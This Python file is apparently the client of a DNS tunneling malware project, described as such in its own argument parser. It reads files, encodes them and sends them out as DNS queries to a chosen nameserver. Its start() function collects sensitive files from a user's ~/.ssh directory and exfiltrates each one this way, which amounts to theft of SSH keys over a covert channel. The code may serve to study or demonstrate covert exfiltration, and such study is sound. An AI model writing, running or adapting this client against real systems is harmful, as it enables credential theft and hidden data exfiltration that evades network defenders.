#!/usr/bin/env python3

# Service level dependencies
import binascii
import hashlib
import os
import sys
import time
from uuid import getnode as get_mac

# Constants
FILEPATH = os.path.abspath(__file__)

# Path modification for project dependencies
def parent_chain(path, n):
    for i in range(n):
        path = os.path.dirname(path)
    return path
sys.path.insert(1, parent_chain(FILEPATH, 2))

# Project level dependencies
import dns.resolver
from client.extractor import Extractor
from lib.data_encoder import Encoder

def send_file_to_server(file, name, server_ip):
    resolver = dns.resolver.Resolver(configure=False)
    mac_address = str(get_mac())
    timestamp = str(int(time.time()))
    responses = []
    with open(file) as f:
        payload = f.read()
        requests = Encoder.encode_payload(
            mac_address, timestamp, name, payload)
        for request in requests:
            resolver.nameservers = [server_ip]
            try:
                query = resolver.query(request)
                query_result = [result.to_text() for result in query]
                responses.extend(query_result)
            except:
                pass
    return responses

def start():
    sensitive_files = Extractor().get_sensitive_files('/Users/coldsauce/.ssh')
    for sensitive_file in sensitive_files:
        send_file_to_server(sensitive_file, sensitive_file, '127.0.0.1')

if __name__ == '__main__':
    import argparse
    import os
    import sys
    parser = argparse.ArgumentParser(description='DNS tunneling malware client')
    parser.add_argument('file')
    args = parser.parse_args()
    response = send_file_to_server(args.file, 'test', '127.0.0.1')
    print(response)
